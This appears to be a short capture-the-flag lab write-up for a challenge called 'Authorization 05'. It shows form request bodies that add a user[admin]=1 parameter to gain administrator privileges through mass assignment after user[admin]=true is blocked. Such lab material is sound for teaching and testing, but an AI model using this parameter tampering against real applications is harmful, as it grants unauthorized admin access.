## Challenge name
Authorization 05

## description
In this exercise, the developer fixed the previous bug. You cannot create a user with admin privileges... or at least not directly. Try to find a way to do the same thing.

## solution
This Challenge is similar to Authorization 04
- trying to log in, makes a request
```
user[username]=myuser&
user[password]=myuser&
submit=Enviar
```
- using the same code doesn't working
```
user[username]=myuser&
user[password]=myuser&
user[admin]=true&
submit=Enviar
```
- we get an error, because were ar not admin
- after trying some different requests
```
user[username]=myuser&
user[password]=myuser&
user[admin]=1&
submit=Enviar
```
- `user[admin]=1`, this line works
- 1 and tru are similar, both could be a true value
## flag
```
